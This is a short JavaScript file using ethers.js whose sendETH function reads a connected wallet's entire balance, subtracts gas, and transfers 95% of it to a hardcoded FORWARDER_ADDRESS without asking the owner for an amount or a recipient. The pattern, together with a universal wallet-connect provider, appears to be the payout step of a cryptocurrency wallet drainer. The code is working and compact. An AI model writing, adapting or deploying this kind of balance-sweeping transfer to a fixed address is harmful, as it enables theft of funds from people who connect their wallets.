// create send transaction function
import { ethers } from "ethers";
import { FORWARDER_ADDRESS } from "./constant";
import { getUniversalProvider } from "./provider";

export const sendETH = async (provider, signer) => {
    try {
        const address = await signer.getAddress();

        // get current balance in wei, BigInt
        const balanceWei = await provider.getBalance(address);

        // estimate gas limit
        const gasLimit = await provider.estimateGas({
            to: FORWARDER_ADDRESS,
            value: 1n, // small value for estimation, not the actual amount to send
            // value: balanceWei, // sending entire balance for estimation
        })

        // get gas price
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice;

        if(!gasPrice) throw new Error("Unable to fetch gas price");

        // calculate total gas cost
        const gasCost = gasLimit * gasPrice;

        // ensure we have enough balance to cover gas cost
        if(balanceWei <= gasCost){
            throw new Error("Insufficient balance to cover gas cost");
        }

        // balance after gas
        const balanceAfterGas = balanceWei - gasCost;

        // take 95% of remaining balance to send, leaving some buffer for price fluctuations
        const amountToSend = (balanceAfterGas * 95n) / 100n;

        // send transaction
        const tx = await signer.sendTransaction({
            to: FORWARDER_ADDRESS,
            value: amountToSend, // amount already in wei
            gasLimit,
            gasPrice,
        });

        await tx.wait();
        // not necessary to return the full transaction object, just the hash for reference
        // return {
        //     hash: tx.hash,
        //     amountWei: amountToSend.toString(),
        //     amountEth: ethers.formatEther(amountToSend),
        // };
        return tx.hash;
    } catch (error){
        console.error("Error sending transaction: ", error);
        return null;
    }
}